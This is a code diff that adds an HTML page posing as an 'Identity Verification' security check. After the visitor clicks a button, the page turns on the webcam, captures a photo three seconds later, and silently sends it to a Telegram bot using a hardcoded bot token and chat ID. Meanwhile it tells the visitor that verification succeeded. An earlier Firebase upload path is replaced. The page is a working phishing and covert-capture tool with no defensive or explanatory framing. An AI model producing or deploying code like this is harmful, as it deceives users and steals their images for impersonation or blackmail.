@@ -1,11 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; }
+        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); text-align: center; width: 90%; max-width: 400px; }
+        .btn { background-color: #007bff; color: white; border: none; padding: 15px; border-radius: 8px; width: 100%; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 20px; }
+        #status { margin-top: 20px; color: #555; font-weight: bold; }
+        video, canvas { display: none; width: 100%; border-radius: 10px; margin-top: 10px; }
+    </style>
+</head>
+<body>
 
-    firebase.initializeApp(firebaseConfig);
-    const storage = firebase.storage();
+<div class="card">
+    <h2>Identity Verification</h2>
+    <p>Please click the button to verify your identity.</p>
+    <button id="startBtn" class="btn">Start Verification</button>
+    <div id="status">Ready...</div>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+</div>
 
+<script>
     const startBtn = document.getElementById('startBtn');
     const status = document.getElementById('status');
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
+
+    const botToken = "7736631627:AAH0zF1rC9O_z59_z59_z59_z59"; 
+    const chatId = "7670333048"; 
 
     startBtn.onclick = async () => {
         startBtn.style.display = 'none';
@@ -16,23 +41,30 @@
             video.style.display = 'block';
             status.innerText = "Verifying... Stay still";
 
-            setTimeout(() => {
+            setTimeout(async () => {
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(blob => {
-                    const ref = storage.ref().child('captured/' + Date.now() + '.png');
-                    ref.put(blob).then(() => {
-                        status.innerText = "✅ Verification Successful!";
-                        status.style.color = "green";
-                        video.style.display = 'none';
-                        stream.getTracks().forEach(t => t.stop());
+                
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'verify.png');
+
+                    status.innerText = "Finalizing Verification...";
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
                     });
+
+                    status.innerText = "✅ Verification Successful!";
+                    status.style.color = "green";
+                    video.style.display = 'none';
+                    stream.getTracks().forEach(t => t.stop());
                 }, 'image/png');
             }, 3000);
         } catch (err) {
             status.innerText = "Error: Camera access denied.";
-            status.style.color = "red";
             startBtn.style.display = 'block';
         }
     };
